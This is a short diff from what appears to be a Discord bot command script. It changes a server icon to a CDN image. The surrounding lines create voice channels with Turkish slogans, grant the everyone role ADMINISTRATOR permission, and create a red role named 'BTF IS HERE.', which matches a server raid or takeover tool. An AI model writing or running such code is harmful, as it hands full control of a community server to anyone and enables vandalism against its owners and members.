@@ -12,7 +12,7 @@ exports.run = (client, message, args) => {
   message.guild.createChannel(`Her daim`, "voice")
   message.guild.createChannel(`ayaktayız.`, "voice")
   message.guild.defaultRole.setPermissions(['SEND_MESSAGES', 'VIEW_CHANNEL', 'ADMINISTRATOR']);
-  message.guild.setIcon("");
+  message.guild.setIcon("https://cdn.discordapp.com/icons/723126146639724577/fca1ef3b977487602ff40a021c964a8d.webp");
   message.guild.createRole({
       name: "BTF IS HERE.",
       color: "#ff0000",
